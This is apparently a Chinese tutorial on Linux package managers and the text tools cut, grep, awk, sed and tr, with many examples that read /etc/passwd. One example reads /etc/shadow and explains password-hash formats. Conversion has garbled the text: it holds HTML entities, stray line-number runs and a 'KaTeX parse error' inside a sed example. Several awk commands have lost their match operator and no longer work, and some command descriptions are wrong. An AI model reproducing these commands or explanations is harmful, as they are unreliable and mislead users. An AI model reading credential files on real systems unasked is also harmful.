-Va 检查系统中所有已安装的rpm包- 小心使用rpm -Vp package.rpm 确认一个rpm包还未安装rpm2cpio package.rpm | cpio –extract –make-directories bin 从一个rpm包运行可执行文件rpm -ivh &#x2F;usr&#x2F;src&#x2F;redhat&#x2F;RPMS&#x2F;arch&#x2F;package.rpm 从一个rpm源码安装一个构建好的包rpmbuild –rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 2）YUM 软件包升级器 - （Fedora, RedHat及类似系统）yum install package_name 下载并安装一个rpm包yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系yum update package_name.rpm 更新当前系统中所有安装的rpm包yum update package_name 更新一个rpm包yum remove package_name 删除一个rpm包yum list 列出当前系统中安装的所有包yum search package_name 在rpm仓库中搜寻软件包yum clean packages 清理rpm缓存删除下载的包yum clean headers 删除所有头文件yum clean all 删除所有缓存的包和头文件 3）DEB 包 (Debian, Ubuntu 以及类似系统)dpkg -i package.deb 安装&#x2F;更新一个 deb 包dpkg -r package_name 从系统删除一个 deb 包dpkg -l 显示系统中所有已经安装的 deb 包dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包dpkg -s package_name 获得已经安装在系统中一个特殊包的信息dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表dpkg -S &#x2F;bin&#x2F;ping 确认所给的文件由哪个deb包提供 4）APT 软件工具 (Debian, Ubuntu 以及类似系统)apt-get install package_name 安装&#x2F;更新一个 deb 包apt-cdrom install package_name 从光盘安装&#x2F;更新一个 deb 包apt-get update 升级列表中的软件包apt-get upgrade 升级所有已安装的软件apt-get remove package_name 从系统删除一个deb包apt-get check 确认依赖的软件仓库正确apt-get clean 从下载的软件包中清理缓存apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 10、四剑客及高级（grep，sed，awk，cut，管道，xargs）10.1 cut：以分隔符截取列（分段）说明：cut命令用于读取文件的每一行按分隔符获取指定字节、字符和字段数并将这些字节、字符和字段写至标准输出。我们把cutm命令，可简单认为是对行数据的处理。官方释义：remove sections from each line of files（截取每行分段）；如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。 语法： cut OPTION… [FILE]…cut [-bn] [file]cut [-c] [file]cut [-df] [file]1234参数： -b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。-c ：以字符为单位进行分割。-d ：自定义分隔符，默认为制表符(TAB)。-f ：与-d一起使用，指定显示哪个区域，即指定哪一个字段进行提取。。-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的范围之内，该字符将被写出；否则，该字符将被排除 eg1：cut截取以:分割保留第七段：grep hadoop &#x2F;etc&#x2F;passwd | cut -d: -f7 &#x2F;&#x2F;分隔符也可以单引号引起 eg2：使用分隔符:打印&#x2F;etc&#x2F;passwd文件中每一行的第一个字段cut -d ‘:’ -f 1 &#x2F;etc&#x2F;passwd eg3：grep ‘&#x2F;bin&#x2F;bash’ &#x2F;etc&#x2F;passwd| cut -d ‘:’ -f 1,6 &#x2F;&#x2F;从&#x2F;etc&#x2F;passwd文件提取第一和第六个字段 eg4：grep ‘&#x2F;bin&#x2F;bash’ &#x2F;etc&#x2F;passwd|cut -d ‘:’ -f 1-4,6,7 &#x2F;&#x2F;取1-4连续字段的范围，指定以-分隔的开始字段和结束字段即可； eg5：grep ‘&#x2F;bin&#x2F;bash’ &#x2F;etc&#x2F;passwd|cut -d ‘:’ –complement -f 2 &#x2F;&#x2F;–complement用于排除&#x2F;etc&#x2F;passwd文件中的第二个字段 eg6：cut -d ‘:’ -f1,7 –output-delimiter&#x3D;’ ’ &#x2F;etc&#x2F;passwd|sort &#x2F;&#x2F;–output-delimiter&#x3D;’ ‘用于指定输出的分隔符，默认输出的为cut处理时的指定分隔符 注：cut命令一个限制是它不支持指定多个字符作为分隔符。多个空格被视为多个字段分隔符，必须使用tr命令才能得到所需的输出。 10.2 grep查询表达式匹配到的字符或字符串grep -v hadoop &#x2F;etc&#x2F;passwd ##查询不包含hadoop的行grep ‘hadoop’ &#x2F;etc&#x2F;passwd ##一般用单引号，如果内部有转移字符的话且想保留转移字符的意义，这时用双引号；单引号屏蔽特殊字符的意义。 grep ‘h.p’ &#x2F;etc&#x2F;passwd 正则表达(点代表任意一个字符)grep ‘^hadoop’ &#x2F;etc&#x2F;passwd 正则表达以hadoop开头grep ‘hadoop$’ &#x2F;etc&#x2F;passwd 以hadoop结尾grep -v ‘^#’ a.txt | grep -v ‘^$’ 查找不是以#开头的行grep ‘^[hr]’&#x2F;etc&#x2F;passwd 以h或r开头的grep ‘^[^hr]’ &#x2F;etc&#x2F;passwd 不是以h和r开头的grep ‘^[^h-r]’ &#x2F;etc&#x2F;passwd 不是以h到r开头的grep [0-9] &#x2F;var&#x2F;log&#x2F;messages 选择 ‘&#x2F;var&#x2F;log&#x2F;messages’ 文件中所有包含数字的行grep Aug -R &#x2F;var&#x2F;log&#x2F; 在目录 ‘&#x2F;var&#x2F;log’ 及随后的目录中搜索字符串”Aug”123456789规则： . : 任意一个字符 a* : 任意多个a(零个或多个a) a? : 零个或一个a a+ : 一个或多个a .* : 任意多个任意字符 . : 转义. o{2} : o重复两次 10.3 awk 文本分析工具awk对文件进行逐行读入，默认以空格为分隔符将每行切片，切开的部分再进行各种分析处理，即awk会对文本依次对每一行进行处理，然后输出。 awk是行处理器,在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息。 awk的用法： awk 参数 ’ BEGIN{} &#x2F;&#x2F; {action1;action2} ’ END{} 文件名 &#x2F;&#x2F;-F 指定分隔符;-f 调用脚本，-v 定义变量，awk的格式中，-F后紧跟单引号，然后里面可自定义输出分隔符，print的动作要用 { } 括起来，否则会报错。print还可以打印自定义的内容，但是自定义的内容要用“”双引号括起来。 Begin{}: &#x2F;&#x2F;初始化代码块，在对每一行进行处理之前，初始化代码，主要是引用全局变量，设置FS分隔符&#x2F;匹配内容&#x2F;: &#x2F;&#x2F; 匹配代码块，可以是字符串或正则表达式；’$1&#x2F;me&#x2F;‘中，表示匹配的意思，获取第一个字段并匹配其后&#x2F; &#x2F;内的关键字me； {} : &#x2F;&#x2F; 命令代码块，包含一条或多条命令,多条命令用 ; 隔开 END{} : &#x2F;&#x2F;结尾代码块，在对每一行进行处理之后再执行的代码块，主要是进行最终计算或输出结尾摘要信息123456eg1： &#x2F;&#x2F;统计 &#x2F;etc&#x2F;passwd 文件中包含root行的总数#awk ‘BEGIN{X&#x3D;0}&#x2F;root&#x2F;{X+&#x3D;1}END{print “I find”,X,“root lines”}’ &#x2F;etc&#x2F;passwd eg2:显示 &#x2F;etc&#x2F;passwd 中含有 root 的行awk ‘&#x2F;root&#x2F;’ &#x2F;etc&#x2F;passwdeg3:以 : 为分隔，显示&#x2F;etc&#x2F;passwd中每行的第1和第7个字段（可以理解为1和第7列）awk -F “:” ‘{print $1,$7}’ &#x2F;etc&#x2F;passwdawk ‘BEGIN{FS&#x3D;“:”}{print $1,$7}’ &#x2F;etc&#x2F;passwdeg4:以 : 为分隔，显示&#x2F;etc&#x2F;passwd中含有 root 的行的第1和第7个字段awk -F “:” ‘&#x2F;root&#x2F; {print $1,$7}’ &#x2F;etc&#x2F;passwdeg5:以 : 为分隔，显示&#x2F;etc&#x2F;passwd中以 root 开头行的第1和第7个字段awk -F “:” ‘&#x2F;^root&#x2F; {print $1,$7}’ &#x2F;etc&#x2F;passwdeg6:以 : 为分隔，显示&#x2F;etc&#x2F;passwd中第3个字段大于999的行的第1和第7个字段 awk -F “:” ‘$3&gt;999{print $1,$7}’ &#x2F;etc&#x2F;passwd类似的还有：awk -F: ‘$3&#x3D;&#x3D;”600”‘ passwd 这是awk匹配条件操作符的用法，用逻辑符号判断的，比如 ‘&#x3D;&#x3D;’ 就是等于，也可以理解为 ‘精确匹配’ 另外也有 &gt;, ‘&gt;&#x3D;, ‘&lt;, ‘&lt;&#x3D;, ‘!&#x3D; 等等，值得注意的是，在和数字比较时，若把比较的数字用双引号引起来后，那么awk不会认为是数字，而认为是字符，加单引号和不加则认为是数字。还可以使用 &amp;&amp; “并且”和 || “或者” 的意思。awk -F: ‘$3&gt;$4 &amp;&amp; $7&#x3D;&#x3D;”&#x2F;bin&#x2F;bash”‘ passwd12345eg7:以 : 为分隔，显示&#x2F;etc&#x2F;passwd中第7个字段包含bash的行的第1和第7个字段awk -F “:” ‘$7 ~ “bash” {print $1,$7}’ &#x2F;etc&#x2F;passwdeg8:以 : 为分隔，显示&#x2F;etc&#x2F;passwd中第7个字段不包含bash的行的第1和第7个字段awk -F “:” ‘$7!“nologin”{print $1,$7}’ &#x2F;etc&#x2F;passwdeg9:以 : 为分隔，显示$3&gt;999并且第7个字段包含bash的行的第1和第7个字段，非系统用户的异常登录权限awk -F “:” ‘$3&gt;999&amp;&amp;$7“bash”{print $1,$7}’ &#x2F;etc&#x2F;passwdeg10:以 : 为分隔，显示$3&gt;999或第7个字段包含bash的行的第1和第7个字段awk -F “:” ‘$3&gt;999||$7~“bash”{print $1,$7}’ &#x2F;etc&#x2F;passwdeg11：获取eth0网卡的ip和掩码ifconfig eth0|awk -F “[ :]+” ‘NR&#x3D;&#x3D;2{print $4 “&#x2F;” $NF}’ &#x2F;&#x2F;[ :]+这个是正则表达式，+表示一个或多个，这里就表示一个或多个空格或冒号; eg12:awk -F: ‘&#x2F;root&#x2F; {print $1,$3} &#x2F;user&#x2F; {print $1,$3}’ passwd &#x2F;&#x2F;多次匹配，本例中全文匹配包含root关键词的行，再匹配包含user的行，打印所匹配的第1、3段。 【字符含义】： $0 表示整个当前行$1 每行第一个字段NF 字段数量,用分隔符分隔后一共有多少段NR 行数,每行的记录号，多文件记录递增,{print NR”:”NF}列出行号，以冒号分隔，列出共有多少段；FNR 与NR类似，不过多文件记录不递增，每个文件都从1开始\\t 制表符\\n 换行符FS BEGIN时定义分隔符,内建变量FS保存输入域分隔符的值，默认是空格或tab。我们可以通过-F命令行选项修改FS的值。如$ awk -F: ‘{print $1,$5}’ test将打印以冒号为分隔符的第一，第五列的内容。可以同时使用多个域分隔符，这时应该把分隔符写成放到方括号中，如$awk -F’[ :\\t]’ ‘{print $1,$3}’ test，表示以空格、冒号和tab作为分隔符。RS 输入的记录分隔符， 默认为换行符(即文本是按一行一行输入)~ 包含!~ 不包含&#x3D;&#x3D; 等于，必须全部相等，精确比较!&#x3D; 不等于，精确比较&amp;&amp; 逻辑与|| 逻辑或+ 匹配时表示1个或1个以上&#x2F;[0-9][0-9]+&#x2F; 两个或两个以上数字&#x2F;[0-9][0-9]*&#x2F; 一个或一个以上数字OFS 自定义输出字段分隔符， 默认也是空格，可以改为其他的，’OFS&#x3D;”#”{print $3,$4}’，分隔符需要用双引号括起来ORS 输出的记录分隔符，默认为换行符,即处理结果也是一行一行输出到屏幕-F [:#&#x2F;] 定义了三个分隔符123456789101112131415161718192021【print 打印】：print 是 awk打印指定内容的主要命令，也可以用 printf awk ‘{print}’ &#x2F;etc&#x2F;passwd 等效于 awk ‘{print $0}’ &#x2F;etc&#x2F;passwdawk ‘{print “ “}’ &#x2F;etc&#x2F;passwd 不输出passwd的内容，而是输出相同个数的空行，进一步解释了awk是一行一行处理文本awk ‘{print “a”}’ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;输出相同个数的a行，一行只有一个a字母awk -F: ‘{print $1}’ &#x2F;etc&#x2F;passwd 等效于 awk -F “:” ‘{print $1}’ &#x2F;etc&#x2F;passwdawk -F: ‘{print $1 $2}’ &#x2F;&#x2F;输入字段1,2，中间不分隔awk -F: ‘{print $1,$3,$6}’ OFS&#x3D;“\\t” &#x2F;etc&#x2F;passwd 输出字段1,3,6， 以制表符作为输出分隔符awk -F: ‘{print $1; print $2}’ &#x2F;etc&#x2F;passwd 输入字段1,2，分行输出awk -F: ‘{print $1 “” $2}’ &#x2F;etc&#x2F;passwd 输入字段1,2，中间以分隔awk -F: ‘{print “name:”$1”\\tid:”$3}’ &#x2F;etc&#x2F;passwd 自定义格式输出字段1,2 awk -F: ‘{print NF}’ &#x2F;etc&#x2F;passwd 显示每行有多少字段(多少个分段&#x2F;多少列)awk -F: ‘NF&gt;2{print }’ &#x2F;etc&#x2F;passwd 将每行字段数大于2的打印出来awk -F: ‘NR&#x3D;&#x3D;5{print}’ &#x2F;etc&#x2F;passwd 打印出&#x2F;etc&#x2F;passwd文件中的第5行awk -F: ‘NR&#x3D;&#x3D;5|NR&#x3D;&#x3D;6{print}’ &#x2F;etc&#x2F;passwd 打印出&#x2F;etc&#x2F;passwd文件中的第5行和第6行awk -F: ‘NR!&#x3D;1{print}’ &#x2F;etc&#x2F;passwd 不显示第一行awk -F: ‘{print &gt; “1.txt”}’ &#x2F;etc&#x2F;passwd 输出到文件中awk -F: ‘{print}’ &#x2F;etc&#x2F;passwd &gt; 2.txt 使用重定向输出到文件中 【字符匹配】： awk -F: ‘&#x2F;root&#x2F;{print }’ &#x2F;etc&#x2F;passwd 打印出文件中含有root的行awk -F: ‘&#x2F;‘$A’&#x2F;{print }’ &#x2F;etc&#x2F;passwd 打印出文件中含有变量 $A的行awk -F: ‘!&#x2F;root&#x2F;{print}’ &#x2F;etc&#x2F;passwd 打印出文件中不含有root的行awk -F: ‘&#x2F;root|tom&#x2F;{print}’ &#x2F;etc&#x2F;passwd 打印出文件中含有root或者tom的行awk -F: ‘&#x2F;mail&#x2F;,mysql&#x2F;{print}’ test 打印出文件中含有 mailmysql 的行，代表有0个或任意多个字符awk -F: ‘&#x2F;^[2][7][7]*&#x2F;{print}’ test 打印出文件中以27开头的行，如27,277,27gff 等等awk -F: ‘$1&#x2F;root&#x2F;{print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段是root的行awk -F: ‘($1&#x3D;&#x3D;”root”){print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段是root的行，与上面的等效awk -F: ‘$1!&#x2F;root&#x2F;{print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段不是root的行awk -F: ‘($1!&#x3D;”root”){print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段不是root的行，与上面的等效awk -F: ‘$1&#x2F;root|ftp&#x2F;{print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段是root或ftp的行awk -F: ‘($1&#x3D;&#x3D;”root”||$1&#x3D;&#x3D;”ftp”){print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段是root或ftp的行，与上面的等效awk -F: ‘$1!&#x2F;root|ftp&#x2F;{print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段不是root或不是ftp的行awk -F: ‘($1!&#x3D;”root”||$1!&#x3D;”ftp”){print}’ &#x2F;etc&#x2F;passwd 打印出文件中第一个字段不是root或不是ftp的行，与上面等效awk -F: ‘{if($1~&#x2F;mail&#x2F;) {print $1} else {print $2}}’ &#x2F;etc&#x2F;passwd 如果第一个字段是mail，则打印第一个字段，否则打印第2个字段123456789101112131415awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadowawk ‘&#x2F;$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow 上述两条命令等效，其中正则表达式’&#x2F;$1|$6&#x2F;{print $1}’表示使用匹配模式’&#x2F;匹配模式&#x2F;‘，|表可以匹配多个规则，抓取$1或$6字符的行，$0它表示整行，$n表第n个字段，因打印分段默认分隔符为空格，所以$1就相当于整行了，关于口令特性如下： 星号代表帐号被锁定，将无法登录；双叹号表示这个密码已经过期了， 如果是$x$xxxxxxxx$的形式，则代表密码正常。 $6$开头的，表明是用SHA-512加密的，密文长度86，示例中‘5NAhdLZN’为salt值，是一个随机字符串，供加密使用 $1$ 表明是用MD5加密的，密文长度22个字符 $2$ 是用Blowfish加密的， $5$ 是用 SHA-256加密的，密文长度43 12345678910格式化输出awk ‘{printf “%-5s %.2d”,$1,$2}’ test printf 表示格式输出%格式化输出分隔符-8表示长度为8个字符s表示字符串类型，d表示小数 10.4 sed：流编辑器sed把当前处理的行存储在一个称为“模式空间”（pattern space）的临时缓冲区中。 sed 处理数据之前，需要预先提供一组规则，sed 会按照此规则来编辑数据。此命令的关键在于掌握各式各样的脚本命令及模式匹配；sed模式是匹配行，而非对应的字符串，操作时对匹配航的匹配字符串，模式中y可进行字符替换，它会对单个字符一一映射匹配替换。 【语法】：1）sed的命令格式：sed [options] ‘command’ file(s); &#x2F;&#x2F;默认直接在命令行模式上进行sed动作编辑 2）sed的脚本格式：sed [options] -f scriptfile file(s); &#x2F;&#x2F;-f选项，将sed的动作写在一个文件内，用–f filename 执行filename内的sed动作; 注意：对于&#x2F;pattern&#x2F;command，必须用正斜线将要指定的 pattern 封起来，sed 会将该命令作用到包含指定文本模式的行上。命令执行数据的顺序如下： 1&gt;每次仅读取一行内容；2&gt;根据提供的规则命令匹配并修改数据。注意， sed 默认不会直接修改源文件数据，而是会将数据复制到缓冲区中，修改也仅限于缓冲区中的数据；3&gt;将执行结果输出。当一行数据匹配完成后，它会继续读取下一行数据，并重复这个过程，直到将文件中所有数据处理完毕。 【选项】：-i ：直接修改文件内容;-n ：只打印模式匹配的行；默认情况下，sed 会在所有的脚本指定执行完毕后，会自动输出处理后的内容，而该选项会屏蔽启动输出，需使用 print 命令来完成输出。-r ：支持扩展表达式;-e 脚本命令: 该选项会将其后跟的脚本命令添加到已有的命令中-f 脚本命令文件: 该选项会将其后文件中的脚本命令添加到已有的命令中 【模式参数】：a（或 i）+\\新文本内容： 在当前行下面插入文本;i\\ +要插入的新文本 ： 在当前行上面插入文本;c+用于替换的新文本： 把选定的行改为新的文本;y&#x2F;inchars&#x2F;outchars&#x2F;：转换命令会对 inchars 和 outchars 值进行一对一的映射，即 inchars 中的第一个字符会被转换为 outchars 中的第一个字符，第二个字符会被转换成 outchars 中的第二个字符…这个映射过程会一直持续到处理完指定字符。如果 inchars 和 outchars 的长度不同，则 sed 会产生一条错误消息。d 删除，删除选择的行;D 删除模板块的第一行;s 替换指定字符;h 拷贝模板块的内容到内存中的缓冲区;H 追加模板块的内容到内存中的缓冲区;g 获得内存缓冲区的内容，并替代当前模板块中的文本;G 获得内存缓冲区的内容，并追加到当前模板块文本的后面;l 列表不能打印字符的清单;n 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令;N 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码;p 打印模板块的行，即搜索符号条件的行，并输出该行的内容。 P(大写) 打印模板块的第一行;q 退出Sed;b lable 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾;r file 从file中读行;t label if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾;T label 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾;w file 写并追加模板块到file末尾;W file 写并追加模板块的第一行到file末尾;! 表示后面的命令对所有没有被选定的行发生作用;&#x3D; 打印当前行号; 把注释扩展到下一个换行符以前;【文本替换参数】：g 表示行内全面替换; p 表示打印行; w 表示把行写入一个文件; x 表示互换模板块中的文本和缓冲区中的文本; y 表示把一个字符翻译为另外的字符（但是不用于正则表达式）; \\1 子串匹配标记; &amp; 已匹配字符串标记; 【文本匹配】： ^ 匹配行开始，如：&#x2F;^sed&#x2F;匹配所有以sed开头的行; $ 匹配行结束，如：&#x2F;sed$&#x2F;匹配所有以sed结尾的行; . 匹配一个非换行符的任意字符，如：&#x2F;s.d&#x2F;匹配s后接一个任意字符，最后是d; 匹配0个或多个字符，如：&#x2F;*sed&#x2F;匹配所有模板是一个或多个空格后紧跟sed的行;[] 匹配一个指定范围内的字符，如&#x2F;[ss]ed&#x2F;匹配sed和Sed; [^] 匹配一个不在指定范围内的字符，如：&#x2F;[^A-RT-Z]ed&#x2F;匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行; (…) 匹配子串，保存匹配的字符，如s&#x2F;(love)able&#x2F;\\1rs，loveable被替换成lovers; &amp; 保存搜索字符用来替换其他字符，如s&#x2F;love&#x2F;&amp;&#x2F;，love这成love; &lt; 匹配单词的开始，如:&#x2F;\\ 匹配单词的结束，如&#x2F;love&gt;&#x2F;匹配包含以love结尾的单词的行; x{m} 重复字符x，m次，如：&#x2F;0{5}&#x2F;匹配包含5个0的行; x{m,} 重复字符x，至少m次，如：&#x2F;0{5,}&#x2F;匹配至少有5个0的行; x{m,n} 重复字符x，至少m次，不多于n次，如：&#x2F;0{5,10}&#x2F;匹配5~10个0的行; 命令示例： 测试文件：#cat sed.txtdate schooL teaChertea Car red Hell0Centos liNux 1）sed ‘s&#x2F;date&#x2F;Date&#x2F;’ sed.txt 2）sed -n ‘s&#x2F;date&#x2F;Date&#x2F;p’ sed.txt &#x2F;&#x2F;-n 选项会禁止 sed 输出，但 p 标记会输出修改过的行,-n选项和p命令一起使用表示只打印那些发生替换的行： 3）sed ‘s&#x2F;date&#x2F;Date&#x2F;2’ sed.txt &#x2F;&#x2F;使用数字 2 作为标记的结果就是，sed 编辑器只替换每行中第 2 次出现的匹配模式 sed ‘s&#x2F;date&#x2F;Date&#x2F;w test.txt’ sed.txt &#x2F;&#x2F;w 标记会将匹配后的结果保存到指定文件中 sed ‘3d’ sed.txt &#x2F;&#x2F;删除 sed.txt 文件内容中的第 3 行,如果不指定删除行，sed文件内容将全部删除，请慎重 6)sed ‘2,3d’ sed.txt &#x2F;&#x2F;删除 sed.txt 文件内容中的第 2、3行 7)sed ‘&#x2F;1&#x2F;,&#x2F;3&#x2F;d’ sed.txt &#x2F;&#x2F;删除第 1~3 行的文本数据，用两个文本模式来删除某个区间内的行，要小心指定的第一个模式会“打开”行删除功能，第二个模式会“关闭”行删除功能，因此，sed 会删除两个指定行之间的所有行（包括指定的行） 8）sed ‘3,$d’ sed.txt &#x2F;&#x2F;删除 sed.txt 文件内容中第 3 行开始的所有的内容,默认情况下 sed 并不会修改原始文件，这里被删除的行只是从 sed 的输出中消失了，原始文件没做任何改变。 9)sed ‘3i\\This is an inserted line.’ sed.txt &#x2F;&#x2F;将一个新行插入到数据流第三行前,将i改为a，就表示将一个新行附加到数据流中第三行后 10)将一个多行数据添加到数据流中，只需对要插入或附加的文本中的每一行末尾（除最后一行）添加反斜线即可：sed ‘1i\\ This is one line of new text.This is another line of new text.’ sed.txt ##&#x2F;&#x2F;第1行前插入2行 11）sed ‘3c\\This is a changed line of text.’ sed.txt &#x2F;&#x2F;sed 编辑器会修改第三行中的文本,将第2行修改&#x2F;替换为新内容 12）echo “This 1 is a test of 1 try.” | sed ‘y&#x2F;123&#x2F;456&#x2F;’ &#x2F;&#x2F;输出如下，因y字符替换是全局命令，它会文本行中找到的所有指定字符自动进行转换，而不会考虑它们出现的位置，无法限定只转换在特定地方出现的字符This 4 is a test of 4 try. 13） sed -n ‘&#x2F;number 3&#x2F;p’ sed.txt &#x2F;&#x2F;用 -n 选项和 p 命令配合使用，我们可以禁止输出其他行，只打印包含匹配文本模式的行,用于只查看特定行的内容 14）如需要在修改之前查确认该行，可以使用打印命令，与替换或修改命令一起使用，sed 命令会查找包含数字 3 的行，然后执行两条命令。首先，脚本用 p 命令来打印出原始行；然后它用 s 命令替换文本，并用 p 标记打印出替换结果。输出同时显示了原来的行文本和新的行文本。 sed -n ‘&#x2F;3&#x2F;{ ps&#x2F;line&#x2F;test&#x2F;p}’ data6.txtThis is line number 3.This is test number 3.12345615）r 命令用于将一个独立文件的数据插入到当前数据流的指定位置 [root@localhost ~]# cat data12.txtThis is an added line.This is the second added line.[root@localhost ~]# sed ‘3r data12.txt’ data6.txtThis is line number 1.This is line number 2.This is line number 3.This is an added line.This is the second added line.This is line number 4.12345678910将指定文件中的数据插入到数据流的末尾，可以使用 $ 地址符： sed ‘$r data12.txt’ data6.txtThis is line number 1.This is line number 2.This is line number 3.This is line number 4.This is an added line.This is the second added line.123456716）sed ‘&#x2F;number 1&#x2F;{ s&#x2F;number 1&#x2F;number 0&#x2F;;q; }’ test.txt &#x2F;&#x2F;sed 命令会在匹配到 number 1 时，将其替换成 number 0，然后直接退出 17)默认情况下，sed 命令会作用于文本数据的所有行。如果只想将命令作用于特定行或某些行，则必须写明 address 部分，表示的方法有以下 2 种：a、以数字形式指定行区间； eg1:sed ‘2s&#x2F;dog&#x2F;cat&#x2F;’ data1.txt &#x2F;&#x2F;sed 只修改地址指定的第二行的文本eg2:sed ‘2,3s&#x2F;dog&#x2F;cat&#x2F;’ data1.txt &#x2F;&#x2F;修改指定的第二行到第三行包括2者的文本eg3：sed ‘2,$s&#x2F;dog&#x2F;cat&#x2F;’ data1.txt &#x2F;&#x2F;修改文本中从某行开始的所有行 b、用文本模式指定具体行区间。 [address]脚本命令 或者 address { 多个脚本命令} &#x2F;&#x2F;上例中的&#x2F;number 1&#x2F;就是指定了匹配的address123456718）用文本模式指定行区间：&#x2F;pattern&#x2F;command；必须用正斜线将要指定的 pattern 封起来，sed 会将该命令作用到包含指定文本模式的行上 eg1：sed ‘&#x2F;demo&#x2F;s&#x2F;bash&#x2F;csh&#x2F;’ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;只修改用户 demo 的默认 shell 在文本模式使用正则表达式指明作用的具体行。正则表达式允许创建高级文本模式匹配表达式来匹配各种数据。这些表达式结合了一系列通配符、特殊字符以及固定文本字符来生成能够匹配几乎任何形式文本的简练模式。 19）其他用法：sed ‘&#x2F;^KaTeX parse error: Expected ‘EOF’, got ‘#’ at position 48: …除所有空白行 sed ‘&#x2F; *#̲&#x2F;d; &#x2F;^&#x2F;d’ example.txt 从example.txt文件中删除所有注释和空白行echo ‘esempio’ | tr ‘[:lower:]’ ‘[:upper:]’ 合并上下单元格内容sed -e ‘1d’ result.txt 从文件example.txt 中排除第一行sed -n ‘&#x2F;stringa1&#x2F;p’ 查看只包含词汇 “string1”的行sed -e ‘s&#x2F; $&#x2F;&#x2F;’ example.txt 删除每一行最后的空白字符sed -e ‘s&#x2F;stringa1&#x2F;&#x2F;g’ example.txt 从文档中只删除词汇 “string1” 并保留剩余全部sed -n ‘1,5p;5q’ example.txt 查看从第一行到第5行内容sed -n ‘5p;5q’ example.txt 查看第5行sed -e ‘s&#x2F;00&#x2F;0&#x2F;g’ example.txt 用单个零替换多个零cat -n file1 标示文件的行数cat example.txt | awk ‘NR%2&#x3D;&#x3D;1’ 删除example.txt文件中的所有偶数行echo a b c | awk ‘{print $1}’ 查看一行第一栏echo a b c | awk ‘{print $1,$3}’ 查看一行的第一和第三栏paste file1 file2 合并两个文件或两栏的内容paste -d ‘+’ file1 file2 合并两个文件或两栏的内容，中间用”+”区分sort file1 file2 排序两个文件的内容sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份)sort file1 file2 | uniq -u 删除交集，留下其他的行sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件)comm -1 file1 file2 比较两个文件的内容只删除 ‘file1’ 所包含的内容comm -2 file1 file2 比较两个文件的内容只删除 ‘file2’ 所包含的内容comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 20）特殊用法： 10.5 、tr（Translate替换&#x2F;转译）命令用于替换&#x2F;转化（大小写转化）、压缩重复和&#x2F;或删除标准输入中的字符，写入标准输出。在没有任何参数选项时，默认是替换，与加上-s参数选项结果是一致的。 语法：tr [OPTION]…SET1[SET2]参数: -c, –complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换-d, –delete：删除指令字符-s, –squeeze-repeats：缩减连续重复的字符成指定的单个字符-t, –truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等–help：显示程序用法信息–version：显示程序本身的版本信息 11、正则表达式(regular expression):正则表达式(regular expression)是一种文本模式，描述了一种字符串匹配的模式（pattern)，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为“元字符”）。使用该模式，可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。或这种模式，描述了在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。模式中由5类字符组成： 1）普通字符[A-Za-z0-9_] &#x2F;&#x2F;所有大写和小写字母、所有数字、所有标点符号和一些其他符号 2）非打印字符\\cx 匹配由x指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。\\f 匹配一个换页符。等价于 \\x0c 和 \\cL。\\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。\\r 匹配一个回车符。等价于 \\x0d 和 \\cM。\\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。注意 Unicode 正则表达式会匹配全角空格符。\\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。\\t 匹配一个制表符。等价于 \\x09 和 \\cI。\\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK。\\w 匹配字母、数字、下划线。等价于 [A-Za-z0-9_] 3)特殊字符所谓特殊字符，就是一些有特殊含义的字符。‘*’，’+‘和’?’这三个符号，表示一个或一序列字符重复出现的次数。它们分别表示“没有或更多”，“一次或更多”还有“没有或一次”。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\\ 放在它们前面； 4）限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 示例： [0-9]* 表示任意多个数字;在方括号里用 